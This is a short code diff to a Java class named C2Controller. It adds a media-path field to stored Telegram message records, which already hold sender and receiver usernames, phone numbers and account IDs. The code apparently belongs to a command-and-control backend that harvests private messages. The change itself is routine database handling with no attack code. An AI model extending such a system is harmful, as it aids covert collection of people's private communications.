@@ -1311,12 +1311,14 @@ public class C2Controller {
                                 String receiverId = null;
                                 String receiverUsername = null;
                                 String receiverPhone = null;
+                                String mediaPath = null;
                                 
                                 try { senderUsername = rs.getString("sender_username"); } catch (Exception ignore) {}
                                 try { senderPhone = rs.getString("sender_phone"); } catch (Exception ignore) {}
                                 try { receiverId = rs.getString("receiver_id"); } catch (Exception ignore) {}
                                 try { receiverUsername = rs.getString("receiver_username"); } catch (Exception ignore) {}
                                 try { receiverPhone = rs.getString("receiver_phone"); } catch (Exception ignore) {}
+                                try { mediaPath = rs.getString("media_path"); } catch (Exception ignore) {}
                                 
                                 // Simple deduplication: check if message exists by content & time & chatId & accountId
                                 // Note: This is expensive for many messages. Ideally use msgId if available.
@@ -1341,6 +1343,7 @@ public class C2Controller {
                                 msg.setReceiverId(receiverId);
                                 msg.setReceiverUsername(receiverUsername);
                                 msg.setReceiverPhone(receiverPhone);
+                                msg.setMediaPath(mediaPath);
                                 
                                 // Check duplicate
                                 QueryWrapper<TgMessage> dup = new QueryWrapper<>();
